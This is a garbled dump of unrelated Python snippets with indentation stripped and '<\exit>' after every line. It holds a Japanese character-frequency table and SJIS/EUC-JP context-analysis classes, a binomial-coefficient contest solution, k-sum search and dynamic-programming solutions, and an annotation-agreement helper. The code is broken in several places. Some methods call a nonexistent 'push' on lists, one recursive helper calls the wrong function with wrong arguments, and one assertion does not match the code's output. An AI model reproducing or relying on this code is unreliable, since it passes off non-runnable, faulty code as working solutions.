(2,4,0,5,0,4,0,4,0,2,4,4,4,3,4,3,3,3,1,2,4,3,4,3,4,4,5,0,3,3,3,3,2,0,4,3,1,4,3,4,1,4,4,3,3,4,4,3,1,2,3,0,4,2,0,4,1,0,3,3,0,4,3,3,3,4,0,4,0,2,0,3,5,3,4,5,2,0,3,0,0,4,5),<\exit>
(0,3,0,4,0,1,0,1,0,1,3,2,2,1,3,0,3,0,2,0,2,0,3,0,2,0,0,0,1,0,1,1,0,0,3,1,0,0,0,4,0,3,1,0,2,1,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,4,2,2,3,1,0,3,0,0,0,1,4,4,4,3,0,0,4,0,0,1,4),<\exit>
(1,4,1,5,0,3,0,3,0,4,5,4,4,3,5,3,3,4,4,3,4,1,3,3,3,3,2,1,4,1,5,4,3,1,4,4,3,5,4,4,3,5,4,3,3,4,4,4,0,3,3,1,2,3,0,3,1,0,3,3,0,5,4,4,4,4,4,4,3,3,5,4,4,3,3,5,4,0,3,2,0,4,4),<\exit>
(0,2,0,3,0,1,0,0,0,1,3,3,3,2,4,1,3,0,3,1,3,0,2,2,1,1,0,0,2,0,4,3,1,0,4,3,0,4,4,4,1,4,3,1,1,3,3,1,0,2,0,0,1,3,0,0,0,0,2,0,0,4,3,2,4,3,5,4,3,3,3,4,3,3,4,3,3,0,2,1,0,3,3),<\exit>
(0,2,0,4,0,3,0,2,0,2,5,5,3,4,4,4,4,1,4,3,3,0,4,3,4,3,1,3,3,2,4,3,0,3,4,3,0,3,4,4,2,4,4,0,4,5,3,3,2,2,1,1,1,2,0,1,5,0,3,3,2,4,3,3,3,4,0,3,0,2,0,4,4,3,5,5,0,0,3,0,2,3,3),<\exit>
(0,3,0,4,0,3,0,1,0,3,4,3,3,1,3,3,3,0,3,1,3,0,4,3,3,1,1,0,3,0,3,3,0,0,4,4,0,1,5,4,3,3,5,0,3,3,4,3,0,2,0,1,1,1,0,1,3,0,1,2,1,3,3,2,3,3,0,3,0,1,0,1,3,3,4,4,1,0,1,2,2,1,3),<\exit>
(0,1,0,4,0,4,0,3,0,1,3,3,3,2,3,1,1,0,3,0,3,3,4,3,2,4,2,0,1,0,4,3,2,0,4,3,0,5,3,3,2,4,4,4,3,3,3,4,0,1,3,0,0,1,0,0,1,0,0,0,0,4,2,3,3,3,0,3,0,0,0,4,4,4,5,3,2,0,3,3,0,3,5),<\exit>
(0,2,0,3,0,0,0,3,0,1,3,0,2,0,0,0,1,0,3,1,1,3,3,0,0,3,0,0,3,0,2,3,1,0,3,1,0,3,3,2,0,4,2,2,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,2,1,2,0,1,0,1,0,0,0,1,3,1,2,0,0,0,1,0,0,1,4),<\exit>
(0,3,0,3,0,5,0,1,0,2,4,3,1,3,3,2,1,1,5,2,1,0,5,1,2,0,0,0,3,3,2,2,3,2,4,3,0,0,3,3,1,3,3,0,2,5,3,4,0,3,3,0,1,2,0,2,2,0,3,2,0,2,2,3,3,3,0,2,0,1,0,3,4,4,2,5,4,0,3,0,0,3,5),<\exit>
(0,3,0,3,0,3,0,1,0,3,3,3,3,0,3,0,2,0,2,1,1,0,2,0,1,0,0,0,2,1,0,0,1,0,3,2,0,0,3,3,1,2,3,1,0,3,3,0,0,1,0,0,0,0,0,2,0,0,0,0,0,2,3,1,2,3,0,3,0,1,0,3,2,1,0,4,3,0,1,1,0,3,3),<\exit>
(0,4,0,5,0,3,0,3,0,4,5,5,4,3,5,3,4,3,5,3,3,2,5,3,4,4,4,3,4,3,4,5,5,3,4,4,3,4,4,5,4,4,4,3,4,5,5,4,2,3,4,2,3,4,0,3,3,1,4,3,2,4,3,3,5,5,0,3,0,3,0,5,5,5,5,4,4,0,4,0,1,4,4),<\exit>
(0,4,0,4,0,3,0,3,0,3,5,4,4,2,3,2,5,1,3,2,5,1,4,2,3,2,3,3,4,3,3,3,3,2,5,4,1,3,3,5,3,4,4,0,4,4,3,1,1,3,1,0,2,3,0,2,3,0,3,0,0,4,3,1,3,4,0,3,0,2,0,4,4,4,3,4,5,0,4,0,0,3,4),<\exit>
(0,3,0,3,0,3,1,2,0,3,4,4,3,3,3,0,2,2,4,3,3,1,3,3,3,1,1,0,3,1,4,3,2,3,4,4,2,4,4,4,3,4,4,3,2,4,4,3,1,3,3,1,3,3,0,4,1,0,2,2,1,4,3,2,3,3,5,4,3,3,5,4,4,3,3,0,4,0,3,2,2,4,4),<\exit>
(0,2,0,1,0,0,0,0,0,1,2,1,3,0,0,0,0,0,2,0,1,2,1,0,0,1,0,0,0,0,3,0,0,1,0,1,1,3,1,0,0,0,1,1,0,1,1,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1,1,2,2,0,3,4,0,0,0,1,1,0,0,1,0,0,0,0,0,1,1),<\exit>
(0,1,0,0,0,1,0,0,0,0,4,0,4,1,4,0,3,0,4,0,3,0,4,0,3,0,3,0,4,1,5,1,4,0,0,3,0,5,0,5,2,0,1,0,0,0,2,1,4,0,1,3,0,0,3,0,0,3,1,1,4,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0),<\exit>
(1,4,0,5,0,3,0,2,0,3,5,4,4,3,4,3,5,3,4,3,3,0,4,3,3,3,3,3,3,2,4,4,3,1,3,4,4,5,4,4,3,4,4,1,3,5,4,3,3,3,1,2,2,3,3,1,3,1,3,3,3,5,3,3,4,5,0,3,0,3,0,3,4,3,4,4,3,0,3,0,2,4,3),<\exit>
(0,1,0,4,0,0,0,0,0,1,4,0,4,1,4,2,4,0,3,0,1,0,1,0,0,0,0,0,2,0,3,1,1,1,0,3,0,0,0,1,2,1,0,0,1,1,1,1,0,1,0,0,0,1,0,0,3,0,0,0,0,3,2,0,2,2,0,1,0,0,0,2,3,2,3,3,0,0,0,0,2,1,0),<\exit>
(0,5,1,5,0,3,0,3,0,5,4,4,5,1,5,3,3,0,4,3,4,3,5,3,4,3,3,2,4,3,4,3,3,0,3,3,1,4,4,3,4,4,4,3,4,5,5,3,2,3,1,1,3,3,1,3,1,1,3,3,2,4,5,3,3,5,0,4,0,3,0,4,4,3,5,3,3,0,3,4,0,4,3),<\exit>
(0,5,0,5,0,3,0,2,0,4,4,3,5,2,4,3,3,3,4,4,4,3,5,3,5,3,3,1,4,0,4,3,3,0,3,3,0,4,4,4,4,5,4,3,3,5,5,3,2,3,1,2,3,2,0,1,0,0,3,2,2,4,4,3,1,5,0,4,0,3,0,4,3,1,3,2,1,0,3,3,0,3,3),<\exit>
(0,4,0,5,0,5,0,4,0,4,5,5,5,3,4,3,3,2,5,4,4,3,5,3,5,3,4,0,4,3,4,4,3,2,4,4,3,4,5,4,4,5,5,0,3,5,5,4,1,3,3,2,3,3,1,3,1,0,4,3,1,4,4,3,4,5,0,4,0,2,0,4,3,4,4,3,3,0,4,0,0,5,5),<\exit>
(0,4,0,4,0,5,0,1,1,3,3,4,4,3,4,1,3,0,5,1,3,0,3,1,3,1,1,0,3,0,3,3,4,0,4,3,0,4,4,4,3,4,4,0,3,5,4,1,0,3,0,0,2,3,0,3,1,0,3,1,0,3,2,1,3,5,0,3,0,1,0,3,2,3,3,4,4,0,2,2,0,4,4),<\exit>
(2,4,0,5,0,4,0,3,0,4,5,5,4,3,5,3,5,3,5,3,5,2,5,3,4,3,3,4,3,4,5,3,2,1,5,4,3,2,3,4,5,3,4,1,2,5,4,3,0,3,3,0,3,2,0,2,3,0,4,1,0,3,4,3,3,5,0,3,0,1,0,4,5,5,5,4,3,0,4,2,0,3,5),<\exit>
(0,5,0,4,0,4,0,2,0,5,4,3,4,3,4,3,3,3,4,3,4,2,5,3,5,3,4,1,4,3,4,4,4,0,3,5,0,4,4,4,4,5,3,1,3,4,5,3,3,3,3,3,3,3,0,2,2,0,3,3,2,4,3,3,3,5,3,4,1,3,3,5,3,2,0,0,0,0,4,3,1,3,3),<\exit>
(0,1,0,3,0,3,0,1,0,1,3,3,3,2,3,3,3,0,3,0,0,0,3,1,3,0,0,0,2,2,2,3,0,0,3,2,0,1,2,4,1,3,3,0,0,3,3,3,0,1,0,0,2,1,0,0,3,0,3,1,0,3,0,0,1,3,0,2,0,1,0,3,3,1,3,3,0,0,1,1,0,3,3),<\exit>
(0,2,0,3,0,2,1,4,0,2,2,3,1,1,3,1,1,0,2,0,3,1,2,3,1,3,0,0,1,0,4,3,2,3,3,3,1,4,2,3,3,3,3,1,0,3,1,4,0,1,1,0,1,2,0,1,1,0,1,1,0,3,1,3,2,2,0,1,0,0,0,2,3,3,3,1,0,0,0,0,0,2,3),<\exit>
(0,5,0,4,0,5,0,2,0,4,5,5,3,3,4,3,3,1,5,4,4,2,4,4,4,3,4,2,4,3,5,5,4,3,3,4,3,3,5,5,4,5,5,1,3,4,5,3,1,4,3,1,3,3,0,3,3,1,4,3,1,4,5,3,3,5,0,4,0,3,0,5,3,3,1,4,3,0,4,0,1,5,3),<\exit>
(0,5,0,5,0,4,0,2,0,4,4,3,4,3,3,3,3,3,5,4,4,4,4,4,4,5,3,3,5,2,4,4,4,3,4,4,3,3,4,4,5,5,3,3,4,3,4,3,3,4,3,3,3,3,1,2,2,1,4,3,3,5,4,4,3,4,0,4,0,3,0,4,4,4,4,4,1,0,4,2,0,2,4),<\exit>
(0,4,0,4,0,3,0,1,0,3,5,2,3,0,3,0,2,1,4,2,3,3,4,1,4,3,3,2,4,1,3,3,3,0,3,3,0,0,3,3,3,5,3,3,3,3,3,2,0,2,0,0,2,0,0,2,0,0,1,0,0,3,1,2,2,3,0,3,0,2,0,4,4,3,3,4,1,0,3,0,0,2,4),<\exit>
(0,0,0,4,0,0,0,0,0,0,1,0,1,0,2,0,0,0,0,0,1,0,2,0,1,0,0,0,0,0,3,1,3,0,3,2,0,0,0,1,0,3,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,4,0,2,0,0,0,0,0,0,2),<\exit>
(0,2,1,3,0,2,0,2,0,3,3,3,3,1,3,1,3,3,3,3,3,3,4,2,2,1,2,1,4,0,4,3,1,3,3,3,2,4,3,5,4,3,3,3,3,3,3,3,0,1,3,0,2,0,0,1,0,0,1,0,0,4,2,0,2,3,0,3,3,0,3,3,4,2,3,1,4,0,1,2,0,2,3),<\exit>
(0,3,0,3,0,1,0,3,0,2,3,3,3,0,3,1,2,0,3,3,2,3,3,2,3,2,3,1,3,0,4,3,2,0,3,3,1,4,3,3,2,3,4,3,1,3,3,1,1,0,1,1,0,1,0,1,0,1,0,0,0,4,1,1,0,3,0,3,1,0,2,3,3,3,3,3,1,0,0,2,0,3,3),<\exit>
(0,0,0,0,0,0,0,0,0,0,3,0,2,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,3,0,3,1,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,2,0,2,3,0,0,0,0,0,0,0,0,3),<\exit>
(0,2,0,3,1,3,0,3,0,2,3,3,3,1,3,1,3,1,3,1,3,3,3,1,3,0,2,3,1,1,4,3,3,2,3,3,1,2,2,4,1,3,3,0,1,4,2,3,0,1,3,0,3,0,0,1,3,0,2,0,0,3,3,2,1,3,0,3,0,2,0,3,4,4,4,3,1,0,3,0,0,3,3),<\exit>
(0,2,0,1,0,2,0,0,0,1,3,2,2,1,3,0,1,1,3,0,3,2,3,1,2,0,2,0,1,1,3,3,3,0,3,3,1,1,2,3,2,3,3,1,2,3,2,0,0,1,0,0,0,0,0,0,3,0,1,0,0,2,1,2,1,3,0,3,0,0,0,3,4,4,4,3,2,0,2,0,0,2,4),<\exit>
(0,0,0,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,3,1,0,0,0,0,0,0,0,3),<\exit>
(0,3,0,3,0,2,0,3,0,3,3,3,2,3,2,2,2,0,3,1,3,3,3,2,3,3,0,0,3,0,3,2,2,0,2,3,1,4,3,4,3,3,2,3,1,5,4,4,0,3,1,2,1,3,0,3,1,1,2,0,2,3,1,3,1,3,0,3,0,1,0,3,3,4,4,2,1,0,2,1,0,2,4),<\exit>
(0,1,0,3,0,1,0,2,0,1,4,2,5,1,4,0,2,0,2,1,3,1,4,0,2,1,0,0,2,1,4,1,1,0,3,3,0,5,1,3,2,3,3,1,0,3,2,3,0,1,0,0,0,0,0,0,1,0,0,0,0,4,0,1,0,3,0,2,0,1,0,3,3,3,4,3,3,0,0,0,0,2,3),<\exit>
(0,0,0,1,0,0,0,0,0,0,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,0,0,1,0,0,0,0,0,3),<\exit>
(0,1,0,3,0,4,0,3,0,2,4,3,1,0,3,2,2,1,3,1,2,2,3,1,1,1,2,1,3,0,1,2,0,1,3,2,1,3,0,5,5,1,0,0,1,3,2,1,0,3,0,0,1,0,0,0,0,0,3,4,0,1,1,1,3,2,0,2,0,1,0,2,3,3,1,2,3,0,1,0,1,0,4),<\exit>
(0,0,0,1,0,3,0,3,0,2,2,1,0,0,4,0,3,0,3,1,3,0,3,0,3,0,1,0,3,0,3,1,3,0,3,3,0,0,1,2,1,1,1,0,1,2,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,2,2,1,2,0,0,2,0,0,0,0,2,3,3,3,3,0,0,0,0,1,4),<\exit>
(0,0,0,3,0,3,0,0,0,0,3,1,1,0,3,0,1,0,2,0,1,0,0,0,0,0,0,0,1,0,3,0,2,0,2,3,0,0,2,2,3,1,2,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,2,0,0,0,0,2,3),<\exit>
(2,4,0,5,0,5,0,4,0,3,4,3,3,3,4,3,3,3,4,3,4,4,5,4,5,5,5,2,3,0,5,5,4,1,5,4,3,1,5,4,3,4,4,3,3,4,3,3,0,3,2,0,2,3,0,3,0,0,3,3,0,5,3,2,3,3,0,3,0,3,0,3,4,5,4,5,3,0,4,3,0,3,4),<\exit>
(0,3,0,3,0,3,0,3,0,3,3,4,3,2,3,2,3,0,4,3,3,3,3,3,3,3,3,0,3,2,4,3,3,1,3,4,3,4,4,4,3,4,4,3,2,4,4,1,0,2,0,0,1,1,0,2,0,0,3,1,0,5,3,2,1,3,0,3,0,1,2,4,3,2,4,3,3,0,3,2,0,4,4),<\exit>
(0,3,0,3,0,1,0,0,0,1,4,3,3,2,3,1,3,1,4,2,3,2,4,2,3,4,3,0,2,2,3,3,3,0,3,3,3,0,3,4,1,3,3,0,3,4,3,3,0,1,1,0,1,0,0,0,4,0,3,0,0,3,1,2,1,3,0,4,0,1,0,4,3,3,4,3,3,0,2,0,0,3,3),<\exit>
(0,3,0,4,0,1,0,3,0,3,4,3,3,0,3,3,3,1,3,1,3,3,4,3,3,3,0,0,3,1,5,3,3,1,3,3,2,5,4,3,3,4,5,3,2,5,3,4,0,1,0,0,0,0,0,2,0,0,1,1,0,4,2,2,1,3,0,3,0,2,0,4,4,3,5,3,2,0,1,1,0,3,4),<\exit>
(0,5,0,4,0,5,0,2,0,4,4,3,3,2,3,3,3,1,4,3,4,1,5,3,4,3,4,0,4,2,4,3,4,1,5,4,0,4,4,4,4,5,4,1,3,5,4,2,1,4,1,1,3,2,0,3,1,0,3,2,1,4,3,3,3,4,0,4,0,3,0,4,4,4,3,3,3,0,4,2,0,3,4),<\exit>
(1,4,0,4,0,3,0,1,0,3,3,3,1,1,3,3,2,2,3,3,1,0,3,2,2,1,2,0,3,1,2,1,2,0,3,2,0,2,2,3,3,4,3,0,3,3,1,2,0,1,1,3,1,2,0,0,3,0,1,1,0,3,2,2,3,3,0,3,0,0,0,2,3,3,4,3,3,0,1,0,0,1,4),<\exit>
(0,4,0,4,0,4,0,0,0,3,4,4,3,1,4,2,3,2,3,3,3,1,4,3,4,0,3,0,4,2,3,3,2,2,5,4,2,1,3,4,3,4,3,1,3,3,4,2,0,2,1,0,3,3,0,0,2,0,3,1,0,4,4,3,4,3,0,4,0,1,0,2,4,4,4,4,4,0,3,2,0,3,3),<\exit>
(0,0,0,1,0,4,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,3,2,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,2),<\exit>
(0,2,0,3,0,4,0,4,0,1,3,3,3,0,4,0,2,1,2,1,1,1,2,0,3,1,1,0,1,0,3,1,0,0,3,3,2,0,1,1,0,0,0,0,0,1,0,2,0,2,2,0,3,1,0,0,1,0,1,1,0,1,2,0,3,0,0,0,0,1,0,0,3,3,4,3,1,0,1,0,3,0,2),<\exit>
(0,0,0,3,0,5,0,0,0,0,1,0,2,0,3,1,0,1,3,0,0,0,2,0,0,0,1,0,0,0,1,1,0,0,4,0,0,0,2,3,0,1,4,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,1,0,0,0,0,0,0,0,2,0,0,3,0,0,0,0,0,3),<\exit>
(0,2,0,5,0,5,0,1,0,2,4,3,3,2,5,1,3,2,3,3,3,0,4,1,2,0,3,0,4,0,2,2,1,1,5,3,0,0,1,4,2,3,2,0,3,3,3,2,0,2,4,1,1,2,0,1,1,0,3,1,0,1,3,1,2,3,0,2,0,0,0,1,3,5,4,4,4,0,3,0,0,1,3),<\exit>
(0,4,0,5,0,4,0,4,0,4,5,4,3,3,4,3,3,3,4,3,4,4,5,3,4,5,4,2,4,2,3,4,3,1,4,4,1,3,5,4,4,5,5,4,4,5,5,5,2,3,3,1,4,3,1,3,3,0,3,3,1,4,3,4,4,4,0,3,0,4,0,3,3,4,4,5,0,0,4,3,0,4,5),<\exit>
(0,4,0,4,0,3,0,3,0,3,4,4,4,3,3,2,4,3,4,3,4,3,5,3,4,3,2,1,4,2,4,4,3,1,3,4,2,4,5,5,3,4,5,4,1,5,4,3,0,3,2,2,3,2,1,3,1,0,3,3,3,5,3,3,3,5,4,4,2,3,3,4,3,3,3,2,1,0,3,2,1,4,3),<\exit>
(0,4,0,5,0,4,0,3,0,3,5,5,3,2,4,3,4,0,5,4,4,1,4,4,4,3,3,3,4,3,5,5,2,3,3,4,1,2,5,5,3,5,5,2,3,5,5,4,0,3,2,0,3,3,1,1,5,1,4,1,0,4,3,2,3,5,0,4,0,3,0,5,4,3,4,3,0,0,4,1,0,4,4),<\exit>
(1,3,0,4,0,2,0,2,0,2,5,5,3,3,3,3,3,0,4,2,3,4,4,4,3,4,0,0,3,4,5,4,3,3,3,3,2,5,5,4,5,5,5,4,3,5,5,5,1,3,1,0,1,0,0,3,2,0,4,2,0,5,2,3,2,4,1,3,0,3,0,4,5,4,5,4,3,0,4,2,0,5,4),<\exit>
(0,3,0,4,0,5,0,3,0,3,4,4,3,2,3,2,3,3,3,3,3,2,4,3,3,2,2,0,3,3,3,3,3,1,3,3,3,0,4,4,3,4,4,1,1,4,4,2,0,3,1,0,1,1,0,4,1,0,2,3,1,3,3,1,3,4,0,3,0,1,0,3,1,3,0,0,1,0,2,0,0,4,4),<\exit>
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),<\exit>
(0,3,0,3,0,2,0,3,0,1,5,4,3,3,3,1,4,2,1,2,3,4,4,2,4,4,5,0,3,1,4,3,4,0,4,3,3,3,2,3,2,5,3,4,3,2,2,3,0,0,3,0,2,1,0,1,2,0,0,0,0,2,1,1,3,1,0,2,0,4,0,3,4,4,4,5,2,0,2,0,0,1,3),<\exit>
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,1,0,0,1,1,0,0,0,4,2,1,1,0,1,0,3,2,0,0,3,1,1,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,1,0,0,0,2,0,0,0,1,4,0,4,2,1,0,0,0,0,0,1),<\exit>
(0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,0,0,0,0,3,1,0,0,0,2,0,2,1,0,0,1,2,1,0,1,1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,1,3,1,0,0,0,0,0,1,0,0,2,1,0,0,0,0,0,0,0,0,2),<\exit>
(0,4,0,4,0,4,0,3,0,4,4,3,4,2,4,3,2,0,4,4,4,3,5,3,5,3,3,2,4,2,4,3,4,3,1,4,0,2,3,4,4,4,3,3,3,4,4,4,3,4,1,3,4,3,2,1,2,1,3,3,3,4,4,3,3,5,0,4,0,3,0,4,3,3,3,2,1,0,3,0,0,3,3),<\exit>
(0,4,0,3,0,3,0,3,0,3,5,5,3,3,3,3,4,3,4,3,3,3,4,4,4,3,3,3,3,4,3,5,3,3,1,3,2,4,5,5,5,5,4,3,4,5,5,3,2,2,3,3,3,3,2,3,3,1,2,3,2,4,3,3,3,4,0,4,0,2,0,4,3,2,2,1,2,0,3,0,0,4,1),<\exit>
)<\exit>
class JapaneseContextAnalysis:<\exit>
def __init__(self):<\exit>
self.reset()<\exit>
def reset(self):<\exit>
self._mTotalRel = 0<\exit>
self._mRelSample = [0] * NUM_OF_CATEGORY<\exit>
self._mNeedToSkipCharNum = 0<\exit>
self._mLastCharOrder = -1<\exit>
self._mDone = False<\exit>
def feed(self, aBuf, aLen):<\exit>
if self._mDone:<\exit>
return<\exit>
i = self._mNeedToSkipCharNum<\exit>
while i < aLen:<\exit>
order, charLen = self.get_order(aBuf[i:i + 2])<\exit>
i += charLen<\exit>
if i > aLen:<\exit>
self._mNeedToSkipCharNum = i - aLen<\exit>
self._mLastCharOrder = -1<\exit>
else:<\exit>
if (order != -1) and (self._mLastCharOrder != -1):<\exit>
self._mTotalRel += 1<\exit>
if self._mTotalRel > MAX_REL_THRESHOLD:<\exit>
self._mDone = True<\exit>
break<\exit>
self._mRelSample[jp2CharContext[self._mLastCharOrder][order]] += 1<\exit>
self._mLastCharOrder = order<\exit>
def got_enough_data(self):<\exit>
return self._mTotalRel > ENOUGH_REL_THRESHOLD<\exit>
def get_confidence(self):<\exit>
if self._mTotalRel > MINIMUM_DATA_THRESHOLD:<\exit>
return (self._mTotalRel - self._mRelSample[0]) / self._mTotalRel<\exit>
else:<\exit>
return DONT_KNOW<\exit>
def get_order(self, aBuf):<\exit>
return -1, 1<\exit>
class SJISContextAnalysis(JapaneseContextAnalysis):<\exit>
def get_order(self, aBuf):<\exit>
if not aBuf:<\exit>
return -1, 1<\exit>
first_char = wrap_ord(aBuf[0])<\exit>
if ((0x81 <= first_char <= 0x9F) or (0xE0 <= first_char <= 0xFC)):<\exit>
charLen = 2<\exit>
else:<\exit>
charLen = 1<\exit>
if len(aBuf) > 1:<\exit>
second_char = wrap_ord(aBuf[1])<\exit>
if (first_char == 202) and (0x9F <= second_char <= 0xF1):<\exit>
return second_char - 0x9F, charLen<\exit>
return -1, charLen<\exit>
class EUCJPContextAnalysis(JapaneseContextAnalysis):<\exit>
def get_order(self, aBuf):<\exit>
if not aBuf:<\exit>
return -1, 1<\exit>
first_char = wrap_ord(aBuf[0])<\exit>
if (first_char == 0x8E) or (0xA1 <= first_char <= 0xFE):<\exit>
charLen = 2<\exit>
elif first_char == 0x8F:<\exit>
charLen = 3<\exit>
else:<\exit>
charLen = 1<\exit>
if len(aBuf) > 1:<\exit>
second_char = wrap_ord(aBuf[1])<\exit>
if (first_char == 0xA4) and (0xA1 <= second_char <= 0xF3):<\exit>
return second_char - 0xA1, charLen<\exit>
return -1, charLen<\exit>
MOD = 10 ** 9<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.C = [[1 for _ in xrange(2000)] for _ in xrange(2000)]<\exit>
for n in xrange(1, 2000):<\exit>
for k in xrange(1, n):<\exit>
self.C[n][k] = self.C[n - 1][k - 1] + self.C[n - 1][k]<\exit>
def solve(self, cipher):<\exit>
N, K = cipher<\exit>
return self.C[N + K - 1][K] % MOD<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
solution = Solution()<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
K = int(f.readline().strip())<\exit>
cipher = N, K<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def kSumII(self, A, k, target):<\exit>
ret = []<\exit>
self.dfs(A, 0, k, [], target, ret)<\exit>
return ret<\exit>
def dfs(self, A, i, k, cur, remain, ret):<\exit>
if len(cur) == k and remain == 0:<\exit>
ret.append(list(cur))<\exit>
return<\exit>
if i >= len(A) or len(cur) > k or len(A)-i+len(cur) < k:<\exit>
return<\exit>
self.dfs(A, i+1, k, cur, remain, ret)<\exit>
cur.append(A[i])<\exit>
self.dfs(A, i+1, k, cur, remain-A[i], ret)<\exit>
cur.pop()<\exit>
def dfs_array(self, A, k, cur, remain, ret):<\exit>
if len(cur) == k and remain == 0:<\exit>
ret.append(list(cur))<\exit>
if not A or len(cur) >= k or len(A)+len(cur) < k:<\exit>
return<\exit>
num = A.pop(0)<\exit>
self.dfs_array(A, k, cur, remain, ret)<\exit>
cur.append(num)<\exit>
self.dfs_array(A, k, cur, remain-num, ret)<\exit>
cur.pop()<\exit>
A.push(0, num)<\exit>
def dfs_stk(self, A, k, cur, remain, ret):<\exit>
if len(cur) == k and remain == 0:<\exit>
ret.append(list(cur))<\exit>
if not A or len(cur) >= k or len(A)+len(cur) < k:<\exit>
return<\exit>
num = A.pop()<\exit>
self.dfs(A, k, cur, remain, ret)<\exit>
cur.append(num)<\exit>
self.dfs(A, k, cur, remain-num, ret)<\exit>
cur.pop()<\exit>
A.append(num)<\exit>
if __name__ == "__main__":<\exit>
print Solution().kSumII([1, 2, 3, 4], 2, 5)<\exit>
assert Solution().kSumII([1, 2, 3, 4], 2, 5) == [[3, 2], [1, 4]]<\exit>
class Solution(object):<\exit>
def kSum(self, A, k, target):<\exit>
return self.dp(A, k, target)<\exit>
def dp(self, A, K, target):<\exit>
n = len(A)<\exit>
f = [[[0 for _ in xrange(target+1)] for _ in xrange(n+1)] for _ in xrange(K+1)]<\exit>
for ind, val in enumerate(A):<\exit>
if val <= target:<\exit>
for j in xrange(ind+1, n+1):<\exit>
f[1][j][val] = 1<\exit>
for i in xrange(2, K+1):<\exit>
for j in xrange(i, n+1):<\exit>
for v in xrange(1, target+1):<\exit>
f[i][j][v] = 0<\exit>
if v-A[j-1] >= 0:<\exit>
f[i][j][v] += f[i-1][j-1][v-A[j-1]]<\exit>
if j-1 >= i:<\exit>
f[i][j][v] += f[i][j-1][v]<\exit>
return f[K][n][target]<\exit>
def dfs_TLE(self, A, k, target, cur, ret):<\exit>
if len(cur) == k and sum(cur) == target:<\exit>
ret[0] += 1<\exit>
if not A or len(cur) >= k:<\exit>
return<\exit>
num = A.pop(0)<\exit>
self.dfs_TLE(A, k, target, cur, ret)<\exit>
A.push(0, num)<\exit>
num = A.pop(0)<\exit>
cur.append(num)<\exit>
self.dfs_TLE(A, k, target, cur, ret)<\exit>
cur.pop()<\exit>
A.push(0, num)<\exit>
def dfs_TLE_2(self, A, k, target, s, l, la, ret):<\exit>
if l == k and s == target:<\exit>
ret[0] += 1<\exit>
if not A or l >= k or la+l < k:<\exit>
return<\exit>
num = A.pop(0)<\exit>
self.dfs_TLE_2(A, k, target, s, l, la-1, ret)<\exit>
self.dfs_TLE_2(A, k, target, s+num, l+1, la-1, ret)<\exit>
A.push(0, num)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().kSum([1, 2, 3, 4], 2, 5) == 2<\exit>
assert Solution().kSum(<\exit>
[1, 3, 4, 5, 8, 10, 11, 12, 14, 17, 20, 22, 24, 25, 28, 30, 31, 34, 35, 37, 38, 40, 42, 44, 45, 48, 51, 54, 56,<\exit>
59, 60, 61, 63, 66], 24, 842) == 453474<\exit>
import sys<\exit>
import os<\exit>
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))<\exit>
from nltk.metrics.agreement import AnnotationTask<\exit>
from brat.tools import anntoconll<\exit>
import io<\exit>
import codecs<\exit>
class KappaRater(object):<\exit>
def __init__(self, S):<\exit>
this_dir = os.path.dirname(os.path.realpath(__file__))<\exit>
dir1 = os.path.join(this_dir, S, "G1")<\exit>
dir2 = os.path.join(this_dir, S, "G2")<\exit>
self.annotation_task = AnnotationTask(data=self.__readfile(dir1, dir2))<\exit>
def __readfile(self, *args):<\exit>
data = []<\exit>
for i in xrange(len(args)):<\exit>
lines = self.__get_lines(args[i])<\exit>
coder = "c"+str(i+1)<\exit>
for ind, line in enumerate(lines):<\exit>
item, label = line<\exit>
d = (coder, str(ind)+"_"+item, label)<\exit>
data.append(d)<\exit>
return data<\exit>
def __get_lines(self, dir):<\exit>
lines = []<\exit>
for root, dirs, files in os.walk(dir):<\exit>
for file in files:<\exit>
if file.endswith(".txt"):<\exit>
with io.open(os.path.join(root, file), 'r', newline='', encoding="utf-8") as f:<\exit>
print f<\exit>
lines += anntoconll.text_to_conll_lines(f)<\exit>
f.close()<\exit>
return lines<\exit>
